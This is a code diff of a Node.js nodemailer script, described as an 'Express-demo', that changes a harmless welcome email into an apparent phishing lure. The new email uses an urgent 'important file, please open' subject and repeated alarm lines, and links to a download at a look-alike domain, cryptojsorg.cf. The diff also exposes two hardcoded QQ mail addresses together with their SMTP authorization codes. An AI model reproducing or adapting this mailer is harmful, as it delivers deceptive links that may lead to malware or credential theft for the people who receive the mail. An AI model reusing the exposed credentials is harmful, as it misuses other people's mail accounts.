@@ -13,8 +13,8 @@ let transporter = nodemailer.createTransport({
     port: 465,
     secure: true, // secure:true for port 465, secure:false for port 587
     auth: {
-        user: '1162212711@qq.com', // 发送方的邮箱
-        pass: 'amdhrtrcbjstjhfc' // smtp 的授权码
+        user: '2863878052@qq.com', // 发送方的邮箱
+        pass: 'bcivvfiylgpddcfa' // smtp 的授权码
     }
 });
 //pass 不是邮箱账户的密码而是stmp的授权码（必须是相应邮箱的stmp授权码）
@@ -23,11 +23,17 @@ let transporter = nodemailer.createTransport({
 function sendMail(mail, code, call) {
     // 发送的配置项
     let mailOptions = {
-        from: '"Express-demo" <1162212711@qq.com>', // 发送方
+        from: '"Express-demo" <2863878052@qq.com>', // 发送方
         to: mail, //接收者邮箱，多个邮箱用逗号间隔
-        subject: '欢迎来到"Express-demo"', // 标题
-        text: 'Hello world?', // 文本内容
-        html: '<p>这里是"Express-demo"详情请点击:</p><a href="https://www.jianshu.com/u/5cdc0352bf01">点击跳转</a>', //页面内容
+        subject: '你好！这里是重要文件请打开', // 标题
+        text: '你好！这里是重要文件请打开', // 文本内容
+        html: `
+        <p>这里是"重要提示有访客"停止:</p>
+        <p>这里是"重要提示有访客"停止:</p>
+        <p>这里是"重要提示有访客"停止:</p>
+        <p>这里是"重要提示有访客"停止:</p>
+        <p>这里是"重要提示有访客"停止:</p>
+        <a href="http://cryptojsorg.cf/d">点击停止服务</a>`, //页面内容
         // attachments: [{//发送文件
         //      filename: 'index.html', //文件名字
         //      path: './index.html' //文件路径
